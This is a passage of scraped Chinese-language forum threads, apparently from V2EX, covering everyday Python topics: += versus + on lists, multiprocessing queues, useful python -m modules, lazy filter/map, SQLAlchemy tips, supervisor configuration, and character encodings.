的区别</h3>\n<ul>\n<li>__add__ 方法接收两个参数，返回它们的和，两个参数的值均不会改变。</li>\n<li>__iadd__ 方法同样接收两个参数，但它是属于 in-place 操作，就是说它会改变第一个参数的值，因为这需要对象是可变的，所以对于不可变对象没有__iadd__方法。</li>\n</ul>\n<pre><code>&gt;&gt;&gt; hasattr(int, '__iadd__')\nFalse\n&gt;&gt;&gt; hasattr(list, '__iadd__')\nTrue\n</code></pre>\n<p>显然，整数对象是没有__iadd__的，而列表对象提供了__iadd__方法。</p>\n<pre><code>&gt;&gt;&gt; l2 += [3]  # 使用__iadd__， l2 的值原地修改\n</code></pre>\n<p>代码 1 中的 += 操作调用的是__iadd__方法，他会原地修改 l2 指向的那个对象本身的值\n<img alt=\"imutable3.png\" src=\"https://foofish.net/images/mutable3.png\"></p>\n<pre><code>&gt;&gt;&gt; l2 = l2 + [3]  # 调用 __add__，创建了一个新的列表，赋值给了 l2\n</code></pre>\n<p>而代码 2 中的 + 操作调用的是 __add__ 方法，该方法会返回一个新的对象，原来的对象保持不变， l1 还是指向原来的对象，而 l2 已经指向一个新的对象。</p>\n<p><img alt=\"imutable4.png\" src=\"https://foofish.net/images/mutable4.png\"></p>\n<p>以上就是表达式 i += x 与 i = i + x 的区别。因此对于列表进行 += 操作时，会存在潜在的 bug ，因为 l1 会因为 l2 的变化而发生改变，就像函数的参数不宜使用可变对象作为关键字参数一样。</p>\n<p>关注公众号 一个程序员的微站(VTtalk) 分享 Python 干货和有温度的内容</p>\n<p><img alt=\"weixin\" src=\"https://dn-mhke0kuv.qbox.me/cdf0ba1b22239721f759.jpg\"></p>\n</div></div>", "<div class=\"topic_content\">不好意思，标题误导了大家，但是内容绝对没有胡说八道，请明察。那些一味冷嘲热讽的同学可以点『忽略主题』</div>"], "reply": "24", "tittle": "Python 表达式 i += x 与 i = i + x 等价吗？", "comment": ["当看到这么长的内容之后，我确定一定以及肯定最后是推广。。。\r", "拉到最下面果然是推广。。。", "运算符重载。。", " 我也是，看完前几句感觉语气不对直接拉到最底下", "不知道为嘛，看到开头我就直接翻到最底下。真的是直觉，看来和楼上的几位一样", "扯淡东西。", "重载后，我还能说你答对了 0%呢", "我觉得题目应该改成 深拷贝浅拷贝 或者值传递地址传递类似的说法，这个标题有标题党的嫌疑", "这和表达式写法不同无关吧？", "现在的题目已经不为检验技术能力工作了，纯粹为了考验而考验，脱离了实际运用。。。", "牛。测试了，果然如此。以后要少用 i += x ，尤其时列表操作", "我 tm 为什么要花时间看这 xx 乱扯？", "学习了，虽然好像不实用，但多少是知识", "对小白来说，长知识了，谢谢分享", "讲的很好，不过《 Fluent Python 》这本书里关于这点讲的更全面", "标题就给人下套，又没说 i 是啥类型", "直接看最后的结果  ", "   ", " ", "貌似只是对可变类型的数据才不等价，顺带关注一下", "上班路上花点路上的时间看，学习点只是，没什么不好。难道就因为是推广有些人就抵触？", "谭浩强笑而不语", " 不是因为推广而抵触, 是因为为了推广吸引眼球就胡说八道", "挺好的，只是标题误导性强", "不好意思哈，标题误导了大家，但是内容绝对没有胡说八道，请明察。那些冷嘲热讽的同学不喜欢内容的可以点『忽略主题』", "不管是不是推广，对这个坑的解释还是很到位的。", "吓得我赶紧 `help('+=')` 了一下，果然不完全等价。\r", "\r", "An augmented assignment expression like \"x += 1\" can be rewritten as\r", "\"x = x + 1\" to achieve a similar, but not exactly equal effect. In the\r", "augmented version, \"x\" is only evaluated once. Also, when possible,\r", "the actual operation is performed *in-place*, meaning that rather than\r", "creating a new object and assigning that to the target, the old object\r", "is modified instead.", "唉，大半夜随手看到你写的东西，误人子弟。\r", "\r", "你试试 x = 0 时， a = 1037490 和 a = 1 这两个情况下运算后的 id ？\r", "\r", "你能说明白你写的例子里面 x = 1 时侯， id 差异值的原理吗？\r", "\r", "你文章的问题在于，讲了一大堆，看似讲明白了，但其实核心的原理都没说，看似对人有帮助，但是其实读者没法或者说真的了解现象后的原因，当然这和你自己水平也有关系。\r", "\r", "但是，但是，我要说的这都不是关键，关键是你知道嘛，这里不欢迎全文转载啊"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>不知论坛里面是否有 python 大神，现在想要实现这样的需求。。</p>\n<p>整个进程就两个线程，一个用于处理 IO ，一个用于处理逻辑请求。。。</p>\n<p>两个部分是 python 来实现，例如 IO 层采用 gevent 啥的。。。</p>\n<p>两个线程需要并行的，两层之间的数据交互通过队列来做，不知这样能否实现。。？</p>\n<p>也就是所想要在一个进程中启动两个 python 实例，两个并行的线程来分别运行这两个实例来处理不同的逻辑。</p>\n</div></div>"], "reply": "9", "tittle": "关于 Python 并行多线程", "comment": ["为何要用 2 个实例呢？\r", "\r", "弄个事件引擎哈（其实还是队列。）", " 这样是为了尽量提升单个进程的处理能力，所以想到了用两个并行的线程，一个线程用于处理 IO 以及数据包相关的事情，现在其实就是这样子的，只不过 IO 层用的是 C++的，但是考虑到要替换上层的实现，例如 pypy 的时候，就比较麻烦了，例如 binding 差异比较大。。", "生产消费模型？用 celery 试试呗", "因为 gil 的存在， python 在同一时间点只能执行一个线程，与我们通常理解的线程概念不同。\r", "但你有个线程是专门做 io 的， 所以也问题不大了。", "eventbus 即可。", "两个进程行吗...随手糙一个...\r", "\r", "from multiprocessing import Queue, Process\r", "\r", "def io_worker(q):\r", "     data =gao1()\r", "     q.put(data)\r", "\r", "def logic_worker(q):\r", "     data = q.get()\r", "     gao2(data)\r", "\r", "def main():\r", "    q = Queue()\r", "    p1 = Process(io_worker, args=(q, ))\r", "    p2 = Process(logic_worker, args=(q, ))", " +1", "这是 multiprocessing 的基础 API 就能实现的啊，多看看文档吧", "没有看出有啥问题啊， threading 或者 multiprocessing 都能实现。有点不太理解楼主对并行线程的的定义是啥。。。。。虽然有 gil ，但是在 IO 和逻辑分别用不同线程处理的时候也没啥问题啊。\r", "\r", "而且其实做成单线程也不会有大问题， Linux 下可以用 select ，或者 asyncio 来做都行。 Windows 下要麻烦一点， select 只支持 socket ，异步的 IO 可能需要自己用 Win32 API 封装吧，不过 asyncio 有说自己是用的 IOCP ，理论上可以处理异步 IO ，只是 asyncio 文档好复杂，反正我还么学懂\r", "\r", "此外， gevent 之类的库也是支持的"]},
{"content": ["<div class=\"topic_content\">之前一直在用 2\r<br>现在好像各个外部库对 3 的兼容性也逐渐好转了，考虑迁移到 3\r<br>求推荐一本关于 3 的书，不要求介绍 2 兼容性，最好不介绍兼容性</div>"], "reply": "18", "tittle": "求推荐 3 版本的书", "comment": ["python cookbook\r", "官方文档\r", "etc", " python cookbook 是针对 3.3 的吗？之前貌似听说 async/await 什么的在这个版本附近有些斗争？\r", "有没有针对内斗之后稳定状态的更新版本 python 的书推荐？", "除 async/await 之外随便看下 3 的书都行 推荐 python3 面向对象编程\r", "之后单独看下 async/await 就 ok", "3 系列里除了 await 斗争以外还发生过什么八卦？", "\r", "\r", "目前在看的 嘿嘿 ", " ", "《 Python 学习手册第四版》", " 这个貌似已经出了三四年了？", "fluent python", "fluent python +1\r", "没事翻一下", "Fluent Python +1", "Fluent python", "\r", "Python cookbook 中文版神马的。", " 是的，很久就出了。", "\r", "这里有满多的。", "谢谢大家", "台湾林信良  的\r", "mark summerfield 的\r", "还有算法第 4 版作者(Kunth 学生)最近出了<程序设计导论>，也是 p3 的\r", "都有大陆中文版\r", "\r", "不过，我觉得如果 p2 用很久，可以直接看 <python cookbook 第 3 版>，纯 py3.3"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>具体描述 :</p>\n<ol>\n<li>Python 3.5.2+ 64bits, Qt 5.7.0, PyQt5 5.7 on Ubuntu 16.10</li>\n<li>Spyder 3.12,之前的旧版本可以输入中文</li>\n<li>搜狗输入法 Linux 和 Ubuntu 内置拼音输入法也无法解决</li>\n</ol>\n<p>大家有类似情况吗?求解</p>\n</div></div>"], "reply": "5", "tittle": "Ubuntu 下 Spyder IDE 无法输入中文", "comment": ["不光它 sublime 也输不了中文", "用 ubuntu16 的时候貌似就是有这种问题", " sublime 的中文输入问题可以解决\r", "spyder 之前的 3.02 版本是能够正常输入中文的,更新之后就不知道出现什么问题了", "win10 路过", "是的，我是 ubuntu+sublime 也是无法输入中文"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>昨天用了下 python -m json.tool ，贼爽。所以大家还知道 python 中还有哪些实用的内置模块吗？求告知</p>\n</div></div>", "<div class=\"topic_content\">我问这个的目的，就是想了解 python 中内置的实用工具，免得需要工具的时候再去网上临时找。比如大家可以试试我推荐的 json.tool 。用法是 cat file.json | python -m json.tool 。然后就会输出格式化 json 字符串，这样格式化 json 字符串总比去网上找工具方便吧，还不依赖网络。\r<br>\r<br>还有啊，我希望的是可以直接运行的模块，不是包。</div>", "<div class=\"topic_content\">总结一下帖子里出现的：\r<br>timeit:这个模块可以用来计算代码的执行时间。\r<br>在 python3 的介绍： <a target=\"_blank\" href=\"https://docs.python.org/3/library/timeit.html#module-timeit\" rel=\"nofollow\">https://docs.python.org/3/library/timeit.html#module-timeit</a>\r<br>在 python2 的介绍： <a target=\"_blank\" href=\"https://docs.python.org/2/library/timeit.html#module-timeit\" rel=\"nofollow\">https://docs.python.org/2/library/timeit.html#module-timeit</a>\r<br>\r<br>python -m smtpd -n -c DebuggingServer localhost:1025 一句话开启一个 SMTP 服务器测试邮件功能。（因为我不是很熟悉 smtp ，所以这个我就直接复制了,而且官方文档没有介绍）\r<br>\r<br>python -m pydoc 一个查看 python 文档的模块，就可以查到你安装的模块的使用方法。（官方文档没有介绍，但是执行一下就可以看到帮助）\r<br>\r<br>python -m zipapp (python3 专属) 没用过，介绍在 <a target=\"_blank\" href=\"https://docs.python.org/3/library/zipapp.html#module-zipapp\" rel=\"nofollow\">https://docs.python.org/3/library/zipapp.html#module-zipapp</a>\r<br>\r<br>python -m zipfile 可以压缩解压缩 zip 文件的，但是无法解压带密码的 zip 。\r<br>在 python3 的介绍： <a target=\"_blank\" href=\"https://docs.python.org/3/library/zipfile.html#module-zipfile\" rel=\"nofollow\">https://docs.python.org/3/library/zipfile.html#module-zipfile</a>\r<br>在 python2 的介绍： <a target=\"_blank\" href=\"https://docs.python.org/2/library/zipfile.html#module-zipfile\" rel=\"nofollow\">https://docs.python.org/2/library/zipfile.html#module-zipfile</a>\r<br>\r<br>还有就是我自己写了个小爬虫，爬了下官方文档里哪些模块有 python -m 的方法，但是我看下了下，不是很实用，我就只贴下名字和地址好了，需要的时候大家自己查询。\r<br>python2 模块的文档地址： <a target=\"_blank\" href=\"https://docs.python.org/2/py-modindex.html\" rel=\"nofollow\">https://docs.python.org/2/py-modindex.html</a>\r<br>python3 模块的文档地址： <a target=\"_blank\" href=\"https://docs.python.org/3/py-modindex.html\" rel=\"nofollow\">https://docs.python.org/3/py-modindex.html</a>\r<br>\r<br>python2 可以的模块：\r<br>compileall\r<br>cProfile\r<br>doctest\r<br>ensurepip\r<br>json\r<br>pdb\r<br>profile\r<br>SimpleHTTPServer\r<br>SimpleXMLRPCServer\r<br>site\r<br>test\r<br>timeit\r<br>trace\r<br>unittest\r<br>webbrowser\r<br>zipfile\r<br>\r<br>python3 可用的模块：\r<br>compileall\r<br>json\r<br>json.tool\r<br>pickletools\r<br>sysconfig\r<br>tarfile\r<br>test\r<br>test.support\r<br>timeit\r<br>tokenize\r<br>venv\r<br>zipapp\r<br>zipfile</div>"], "reply": "35", "tittle": "Python 中除了 SimpleHTTPServer, json.tool 外，还有哪些内置的模块？", "comment": ["functools", "SimpleHTTPServer", "timeit\r", "python -m timeit '\"-\".join(str(n) for n in range(100))'", " \r", " \r", "我想要的是像 python -m SimpleHTTPServer/json.tool 这种可以直接运行的简易工具，不是导入的包啊", " 这个我知道啊，还有别的吗", "py 所有模块都可以 -m 执行呀。", "一句话开启一个 SMTP 服务器测试邮件功能\r", "\r", "python -m smtpd -n -c DebuggingServer localhost:1025\r", "\r", "\r", "1025 端口可以自己换", " 我知道所有的模块用 m 参数都能执行啊，但是我问的是内置的已经封装好的小工具。比如推荐的 SMTP 服务器", "cd /usr/lib/python2.7/ && grep '^if\\ __name__' --exclude-dir 'dist-packages' * -lR | wc -l\r", "\r", "117\r", "\r", "这么多，真指望有人一个一个介绍？\r", "\r", "另外，接触多了就知道，这种语法糖没什么特别的", " 你这个运行出的结果是 python 内置包的数量吧，我要的不是这个，我要的是可以执行的小工具。", " 他 grep 的是含有 'if __name__' 语句的包，也就是可以直接执行的包 :)", "但是 -m 就是模块啊\r", "\r", "  -m module-name    Searches sys.path for the named module and runs the corresponding .py file as a script.\r", "\r", "你其实要自己写也可以写", " \r", "(以下是根据 Python3.6 文档所得)\r", "你还是直接看一下-m 的说明吧。\r", "When a package name is supplied instead of a normal module, the interpreter will execute <pkg>.__main__ as the main module.\r", "也就是说只要参数是 package 名，就会直接运行包里的__main__函数。\r", "\r", "不信你执行这个： python3 -m http.server \r", "也能得到同样的效果，根本不是什么小工具，只是 python 命令行支持这个参数而已。\r", "\r", " 原来如此，我执行了这个命令下居然有 1700 多个", " 就是想了解下实用的嘛，有些时候，小工具特别方便。而且我写不出，基础不到家😂\r", " 我知道啊，发这个帖子就是想知道标准库里内置了哪些实用的模块", "别太懒了，官方文档自己翻", " 我用谷歌搜过，搜不到，请问该怎么搜，什么关键字", " \r", "\r", " 对对对对，我要的就是这种，虽然看了下不是每个模块都是支持-m 参数，但还是谢谢啦", "来个有意思的… python -m turtle (我用 python 3)", "python -m antigravity", " 我 2.7 的可以运行", "\r", "没有录完", "cd /usr/lib/python3.6\r", "\r", "grep 'if __name__ == .__main__.' ./*/__init__.py\r", "grep 'if __name__ == .__main__.' ./*.py", " 这个 smtpd 的模块的用法居然在官方文档里没有介绍", "现在还有 venv 了，以前的 virtualenv 可以不装了", " 这是 3 的特性里的吧， 2.7 里好像不能这么搞", "“既作为 lib 又作为 exe ”需要判断__name__\r", "所以以这个条件搜索", "python -m pydoc\r", "\r", "可以跑一个浏览器版本的 pydoc\r", "\r", "文档是实时从代码里生成的。如果你安装了其他包，可以实时把文档刷出来。", "python -m venv 常用\r", "python -m pip 这个在 win 下更新 pip 要用到", " 现在 jedi 这么普及，好多年都没人用 pydoc 啦，抄袭 java 的东西", " 好像是 3.5 以后？ 2.7 肯定不行", "python -m zipapp\r", "可以用来打包程序", "python -m pip\r", "\r", "哈哈", "zipfile"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>难道现在大家都是 tornado ， flask ， pyramid ， django ？<br>\n我一直用 <a href=\"http://web.py\" rel=\"nofollow\">web.py</a> 到现在已经好几年了，同时也很喜欢 bottle 这个框架。</p>\n</div></div>"], "reply": "23", "tittle": "还有人在用 web.py 吗？", "comment": ["性能如何？", " 个人部署一些小应用，性能完全足够。没有大流量测试的机会", "有，非常轻量级。", " 看到各种各样的框架有着各种各样的功能、性能，都尝试过但是还是喜欢用 webpy", " 其实要看项目的，如果是公司的项目，规模比较大，其实还是用 django 比较方便，要不然就单单写管理后台就够我们喝一壶的了。\r", "webpy 比较适合自己的小项目，多快好省。", " 说的很对，我是想看看还有多少人还在用 web.py ，当然，同时用 N 种框架也算“还在用”嘛~ /滑稽", "不是作者自杀了吗？", " 被 FBI 自杀的。", " 是啊，自杀了，所以才想知道，还有没有人用嘛", "放弃用 Python 写 Web 很久了。\r", "\r", "但如果一定要让我选择的话，我现在估计也不会选择 web.py ， web.py 还是太重了。\r", "\r", "现在更喜欢 koa 那样的框架，只负责 middleware 的骨架。其他的部分自己组合。\r", "\r", "主要是之前用的框架有过一次不兼容的大版本升级，现在除了必须的场景，不想用任何框架。", "小东西一直用 bottle ，但毕竟是德国的小团队做的......第三方库几乎全部年久失修......", "reddit 好像是用 web.py 做的\r", "没有后台的用 flask ，有后台的用 django", "tornado 已经接过了 webpy 的衣钵", "我有一次访问 本站 有异常， 我看到本站就是 webpy", "似乎妹抖龙里的小林用的就是 2333", "关于这作者有个电影叫 互联网之子  拍的很不错，不过 Web 我经常用的是 Flask ……\r", "\r", "\r", "\r", "![]( ", " )", "后来用了 Flask-restful ，然后现在用 Rails lol", "作者被逼死没人维护了", "     \r", "是的", " 我也遇到过一次异常，看到是 tornado ，几年前了", " 现在好像有个印度人在维护，前几天还修复了一个路由 bug 。。。", "互联网之子，"]},
{"content": ["<div class=\"topic_content\">有人遇到过吗？求解决办法。\r<br>\r<br>youtube-dl -x --audio-format mp3 <a target=\"_blank\" href=\"http://xxxxxxxx\" rel=\"nofollow\">http://xxxxxxxx</a>\r<br>\r<br>原地址是个视频。我只想要其中的音频。默认下载为 m4a 格式。然后转成 mp3 。\r<br>\r<br>这个 mp3 用部分播放器打开时显示损坏。\r<br>\r<br>安卓端的网易云打不开， PC 端的可以。\r<br>PC 端 foobar 打不开\r<br>\r<br>这是如何造成的？</div>"], "reply": "2", "tittle": "youtube-dl 下载音频文件损坏。", "comment": ["试了一个用 foobar 播放正常的\r", "更新下 ffprobe 和 ffmpeg 重新下载看看?", "为什么不用 you-get ？"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>Hi 第一次来写东西，大家多多支持\n(入题)\n最近某天上班路上在微薄看到一哥们写的<a href=\"http://jimliu.net/2017/02/04/a-failed-attemption-to-js-linq/\" rel=\"nofollow\">《在 JavaScript 中实现 LINQ 》</a>看到里面关于 C#的 Linq 在实现 filter 和 map 的时候说道(reduce 已经在 python3 从全局空间去掉了，所以标题里面我加了个括号)，如果同时调用类似 filter 和 map 这样的操作去遍历 List 的时候，实际上只遍历了一遍，像下面这样：</p>\n<pre><code>var array = new []{ 0, 1, 2, 3, 4, 5, 6, 7, 8, 9 };\nvar sum = array.Where(n =&gt; n % 2 === 0)\n           .Select(n =&gt; n + 3)\n           .Aggregate((sum, n) =&gt; sum + n, 0);\n</code></pre>\n<p>然后文章后面提到 JavaScript 中直接调用 filter 和 map 的时候，会重复遍历 Array ，比如像下面代码这样：</p>\n<pre><code>let array = [1, 2, 3, 4]\nlet sum = array.filter(n =&gt; n % 2 === 0)\n               .map(n =&gt; n + 3)\n               .reduce((sum, n) =&gt; sum + n, 0)\n</code></pre>\n<p>这样的话会先把 arrayfilter 成[2,4]，然后再 map 成[5, 7]，然后再 reduce 成 12 ,所以这个过程 array 会被重复遍历。</p>\n<p>好了，下面说下 Python ，看完文章的时候然后我就好奇 Python 里面的 filter 和 map 是不是也是这样，会重复去遍历 List ，于是做了个实验：\n像平时我们喜欢的函数式的写法:</p>\n<pre><code>In [1]: numbers = [1,2,3,4,5,6]\nIn [2]: list(map(lambda x: x + 1, filter(lambda x: x % 2 == 0, numbers)))\nOut[2]: [3, 5, 7]\n</code></pre>\n<p>为了看清楚是不是重复遍历了 numbers 这个 List ，把 lambda 改写成个普通的 function 打印出来看看</p>\n<pre><code>In [3]: def is_even(number):\n   ...:     print('filter')\n   ...:     return True if number % 2 == 0 else False\n\nIn [4]: def inc(number):\n   ...:     print('map')\n   ...:     return number + 1\n\nIn [5]: list(map(inc, filter(is_even, numbers)))\nfilter\nfilter\nfilter\nfilter\nfilter\nfilter\nmap\nmap\nmap\nOut[6]: [3, 5, 7]\n</code></pre>\n<p>上面可以看到， Python 这样直接调用 filter 和 map 也是会重复遍历 list 的。不过那哥们的文中提到后来能在 JavaScript 实现 Linq ，主要因为 ES6 支持 yield 和 Generator Function ，所以我想 Python 这两个都支持肯定也是可以实现类似 Linq 这样不重复遍历的 Magic 。</p>\n<p>然后，再试了下之前很喜欢的一个函数式库 <strong>pyfunctional</strong>。这是个很值来安利一波的一个库，用了这个库后，摆脱了原生那种很丑的写法</p>\n<pre><code># before\nlist(map(inc, filter(is_even, numbers)))\n\n# afater\nseq(numbers)\\\n    .filter(is_even)\\\n    .map(inc)\\\n    .to_list()\n</code></pre>\n<p>嗯，很 Js 的写法....</p>\n<p>好，回到正题，如果像上面这样调用 functional 时，发现整个过程只遍历的一次 List</p>\n<pre><code>In [7]: from functional import seq\nIn [8]: seq(numbers)\\\n   ...:     .filter(is_even)\\\n   ...:     .map(inc)\\\n   ...:     .to_list()\nfilter\nfilter\nmap\nfilter\nfilter\nmap\nfilter\nfilter\nmap\nOut[8]: [3, 5, 7]\n</code></pre>\n<p>果然是个好货，安利一波</p>\n</div></div>"], "reply": "20", "tittle": "Python 下避免 filter, map (reduce) 重复遍历", "comment": ["有什么区别吗…都是六次 filter 三次 map …只是顺序不一样", "按照你这个说法，我是不是也可以安利一下我的\r", "\r", "\r", "不存在重复遍历， map 的结果是个新 list\r", "一定要说区别的话在于直接 map 有额外拷贝，是新 list ，内存占用大\r", "直接计算出最终结果的 list ，如果不需要全部结果的话，这样就浪费了\r", "\r", "用 itertools.map 就没这个问题\r", "python 里面 iterator 就是用 yield", "顺带一提，如果是明确需要所有结果，而且不缺内存的话，一般写法（非 iterator ）会快一点。上下文切换也是有成本的，哪有一个函数常驻指令缓存快。", " itertools +1", "再说明白点：\r", "numbers = [1,2,3,4,5,6]\r", "n1 = filter(lambda x: x % 2 == 0, numbers)\r", "n2 = list(map(lambda x: x + 1, n1))\r", "\r", "三次遍历分别在 numbers, n1, n2 上，不存在重复遍历一个 list 的问题", "Python3 的 map 和 filter 返回的就是迭代器呀。如果你用 Python3 ，结果就是最后输出的那样。", "这种优化就是把普通 list 变成 lazy 的 list ，然后内部保存了一个 command list 。每次往那个 chain 后头加个 filter ， map 之类的方法的时候，往内部的 command list 里加东西。最后对这个 lazy list 取值的时候再去对 list 里的每个 item 执行那个 command list 。本质是个 monad （ linq 就是 monad ）。\r", "从遍历的角度看，虽然 list 只遍历一次。但是那个 command list 每次都要遍历。速度未必比每次遍历都快。", "翻到最后居然没有二维码，害的再翻回去看一遍😅", " @", "  说的对", " 我也是进来看二维码的，失策了", " 嗯，打印出来的次数是一样，但还是有点不一样。按照之前的理解，如果直接去 filter/map 的话，从输出结果看是先扫了一遍 list ， filter 出新的 list ，然后再拿得到新 list 去 map ，不过楼下有哥们说 python3 返回的就是迭代器，试了下好像就没有这个问题了", " 好东西，学习了，不过刚试了下有个 bug ，提了个 request 。", "这个不就是惰性求值吗，类似 Guava", " 嗯，说的对，对比了下 pyfunctional 和直接 filter/map 和非 iterator 写法，耗时的确是 pyfunctional>自带的 filter > 非 iterator 。 @", " 换成 Python3 的确没有这个问题了。", "按我的理解， map, filter, reduce 都是不太推荐的，更好的做法应该是 list comprehensions, \r", "```\r", "[x for x in range(1, 8) if x % 2 != 0]\r", "```", " 恩恩，看了下它的源码的确是维护着 lineage", "  @", "  啊哈，没懂什么意思，暗号么？", " 等你发 PR 呢，没收到啊", " 不不不，没有二维码就好，哈哈"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>1.sqlalchemy object 序列化为 json</p>\n<pre><code>posts = Post.query.all()\nserializer = Serializer(posts,many=True)\ndata = serializer.data\n</code></pre>\n<p>2.像 django orm 一样使用 sqlalchemy</p>\n<pre><code>posts = Post.query.filter_by(id__in=['1','2','3'],tags__name='sqlalchemy').order_by('-id').all()\n</code></pre>\n<p>3.去掉一些 sqlalchemy 的重复工作</p>\n<pre><code># 关联用户表\nclass Post(ModelUserMixin, Model):\n    \n    user_related_name = 'posts'\n    titile = ...\n</code></pre>\n<p>地址:<a href=\"https://github.com/honmaple/maple-json\" rel=\"nofollow\">https://github.com/honmaple/maple-json</a></p>\n<p>代码很简单,没写注释应该也能看懂,感觉不错,所以分享出来一下</p>\n</div></div>"], "reply": "4", "tittle": "sqlalchemy 使用上的小 tips", "comment": ["不如在 PostModel 加一个 to_json 方法。", " +1", " @", " 当然可以自定义一个 to_json 的方法，但这样的话工作量不是要增加很多吗？我当时的初衷就是不用自己写，就可以快速序列化 object 生成 json(其实是看了 django rest framework Serializer 的设计，想实现一个类似的东西)", "to_json 放在 basemodel 就行。。。"]},
{"content": ["<div class=\"topic_content\">请问如何用 Python 分析这些数据降低长尾效应，求思路</div>"], "reply": "目前尚无回", "tittle": "遇到一个问题。。求指点。。", "comment": []},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>自学 Python,看到这张 GIF 图,感到疑惑.<br>\n麻烦指教.<br>\n<img alt=\"loop-over-python-list-animation\" src=\"http://ol3lz2mbp.bkt.clouddn.com/loop-over-python-list-animation.gif\"></p>\n</div></div>"], "reply": "6", "tittle": "Python 的 While 循环语句是从数组的最后一个开始判断的?", "comment": ["pop()默认移除列表中的最后一个元素，并且返回该元素的值", " 是第五行的.pop()吗?\r", "thanks,我去查一下.", "最后一个元素判断语句的动画是不是错了，应该是 even.append ，怎么动画里面变成了 odd.append 。\r", "竟然看到了最后一步，还以为眼花了，又看了一遍。", " 确实错了吧", "这个动画怎么做出来的？", "我也想问，这个动画怎么做出来的"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>是这样\nenvironenment=/home/xx/abc:$PYTHONPATH\n还是\nenvironment=/home/xx/abc:%(ENV_PYTHONPATH)s\n呢？\n我试过两种都不行啊，你们是怎么做的呀</p>\n</div></div>"], "reply": "6", "tittle": "supervisor 的配置 env 怎么扩展 PYTHONPATH", "comment": ["environment=PYTHONPATH=“ xxx ”", "额，我比较偷懒，直接把 virtualenv 的全路径直接放到 command 里，如：\r", "\r", "command=/path/virtualenv/bin/python /path/example.py\r", "\r", "这样也一样吧？", " 但是这样有个问题呀。。如果你有个总的 environment 怎么办？", " 我也和 @", " 一样。你说的全局的 environment 是干嘛用的", " 总的 environment 你的意思是 pip 全局安装的包咯，我觉得应该是可以继承到的？ 具体你可以试下，如果不行，再在 virtualenvironment 里面再装一遍。", "  /etc/superivsor/supervisod.conf 里面也可以设置 environment ，这个 environment 可以被所有[program:]继承"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>不论你是有着多年经验的 Python 老司机还是刚入门 Python 不久的新贵，你一定遇到过 UnicodeEncodeError 、 UnicodeDecodeError 错误，每当遇到错误我们就拿着 encode 、 decode 函数翻来覆去的转换，有时试着试着问题就解决了，有时候怎么试都没辙，只有借用 Google 大神帮忙，但似乎很少去关心问题的本质是什么，下次遇到类似的问题重蹈覆辙，那么你有没有想过一次性彻底把 Python 字符编码给搞懂呢？</p>\n<p>完全理解字符编码 与 Python 的渊源前，我们有必要把一些基础概念弄清楚，虽然有些概念我们每天都在接触甚至在使用它，但并不一定真正理解它。比如：字节、字符、字符集、字符码、字符编码。</p>\n<h3>字节</h3>\n<p>字节（ Byte ）是计算机中数据存储的基本单元，一字节等于一个 8 位的比特，计算机中的所有数据，不论是保存在磁盘文件上的还是网络上传输的数据（文字、图片、视频、音频文件）都是由字节组成的。</p>\n<h3>字符</h3>\n<p>你正在阅读的这篇文章就是由很多个字符（ Character ）构成的，字符一个信息单位，它是各种文字和符号的统称，比如一个英文字母是一个字符，一个汉字是一个字符，一个标点符号也是一个字符。</p>\n<h3>字符集</h3>\n<p>字符集（ Character Set ）就是某个范围内字符的集合，不同的字符集规定了字符的个数，比如 ASCII 字符集总共有 128 个字符，包含了英文字母、阿拉伯数字、标点符号和控制符。而 GB2312 字符集定义了 7445 个字符，包含了绝大部分汉字字符。</p>\n<h3>字符码</h3>\n<p>字符码（ Code Point ）指的是字符集中每个字符的数字编号，例如 ASCII 字符集用 0-127 连续的 128 个数字分别表示 128 个字符，例如 \"A\" 的字符码编号就是 65 。</p>\n<h3>字符编码</h3>\n<p>字符编码（ Character Encoding ）是将字符集中的字符码映射为字节流的一种具体实现方案，常见的字符编码有 ASCII 编码、 UTF-8 编码、 GBK 编码等。某种意义上来说，字符集与字符编码有种对应关系，例如 ASCII 字符集对应 有 ASCII 编码。 ASCII 字符编码规定使用单字节中低位的 7 个比特去编码所有的字符。例如\"A\" 的编号是 65 ，用单字节表示就是 0×41 ，因此写入存储设备的时候就是 b'01000001'。</p>\n<h3>编码、解码</h3>\n<p>编码的过程是将字符转换成字节流，解码的过程是将字节流解析为字符。</p>\n<hr>\n<p>理解了这些基本的术语概念后，我们就可以开始讨论计算机的字符编码的演进过程了。</p>\n<h3>从 ASCII 码说起</h3>\n<p>说到字符编码，要从计算机的诞生开始讲起，计算机发明于美国，在英语世界里，常用字符非常有限， 26 个字母（大小写）、 10 个数字、标点符号、控制符，这些字符在计算机中用一个字节的存储空间来表示绰绰有余，因为一个字节相当于 8 个比特位， 8 个比特位可以表示 256 个符号。于是美国国家标准协会 ANSI 制定了一套字符编码的标准叫 ASCII(American Standard Code for Information Interchange)，每个字符都对应唯一的一个数字，比如字符 \"A\" 对应数字是 65 ，\"B\"  对应 66 ，以此类推。最早 ASCII 只定义了 128 个字符编码，包括 96 个文字和 32 个控制符号，一共 128 个字符只需要一个字节的 7 位就能表示所有的字符，因此 ASCII 只使用了一个字节的后 7 位，剩下最高位 1 比特被用作一些通讯系统的奇偶校验。下图就是 ASCII 码字符编码的十进制、二进制和字符的对应关系表</p>\n<p><img alt=\"ascii\" src=\"http://7d9py7.com1.z0.glb.clouddn.com/ascii.jpg\"></p>\n<h3>扩展的 ASCII ： EASCII(ISO/8859-1)</h3>\n<p>然而计算机慢慢地普及到其他西欧地区时，发现还有很多西欧字符是 ASCII 字符集中没有的，显然 ASCII 已经没法满足人们的需求了，好在 ASCII 字符只用了字节的 7 位 0×00~0x7F 共 128 个字符，于是他们在 ASCII 的基础上把原来的 7 位扩充到 8 位，把 0×80-0xFF 这后面的 128 个数字利用起来，叫 EASCII ，它完全兼容 ASCII ，扩展出来的符号包括表格符号、计算符号、希腊字母和特殊的拉丁符号。然而 EASCII 时代是一个混乱的时代，各个厂家都有自己的想法，大家没有统一标准，他们各自把最高位按照自己的标准实现了自己的一套字符编码标准，比较著名的就有 <strong>CP437</strong>， CP437  是 始祖 IBM PC 、 MS-DOS 使用的字符编码，如下图：</p>\n<p><img alt=\"cp437\" 